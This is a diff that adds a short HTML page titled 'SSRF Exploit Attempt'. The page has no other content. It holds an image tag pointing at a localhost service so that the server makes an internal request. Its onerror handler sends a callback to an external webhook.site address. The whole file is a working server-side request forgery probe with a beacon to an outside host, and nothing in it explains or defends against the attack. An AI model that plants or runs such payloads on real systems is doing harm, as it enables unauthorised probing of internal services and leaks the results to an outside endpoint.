@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Exploit Attempt</title>
+</head>
+<body>
+    <!-- Force the server to make a GET request -->
+    <img src="http://localhost:5000" alt="SSRF Test" onerror="fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e/?error=img-error')">
+</body>
+</html>
